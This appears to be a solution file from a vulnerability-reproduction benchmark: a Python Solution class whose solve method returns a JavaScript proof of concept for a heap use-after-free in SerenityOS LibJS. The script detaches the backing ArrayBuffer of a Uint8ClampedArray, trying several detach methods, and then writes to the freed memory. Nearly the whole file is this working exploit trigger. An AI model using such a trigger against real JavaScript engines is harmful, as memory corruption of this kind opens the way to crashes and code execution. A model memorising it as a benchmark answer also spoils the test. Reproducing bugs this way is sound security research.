import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC for Heap Use After Free in Uint8ClampedArray (LibJS).
        The vulnerability exists because Uint8ClampedArray was implemented separately
        and failed to check if the underlying ArrayBuffer was detached before access.
        """
        poc = b"""
function detach(buffer) {
    try {
        // Standard test-harness function in SerenityOS LibJS
        detachArrayBuffer(buffer);
        return;
    } catch (e) {}

    try {
        // Alternative location in 'internals' object
        internals.detachArrayBuffer(buffer);
        return;
    } catch (e) {}

    try {
        // Standard Web API way to detach a buffer
        structuredClone(undefined, { transfer: [buffer] });
        return;
    } catch (e) {}
}

// 1. Create the vulnerable object
var u8 = new Uint8ClampedArray(128);
var buf = u8.buffer;

// 2. Detach the backing store (free the memory)
detach(buf);

// 3. Access the array to trigger Use-After-Free
// In the vulnerable version, this access does not check is_detached()
// and reads/writes to the freed memory region.
u8[0] = 0x41;
"""
        return poc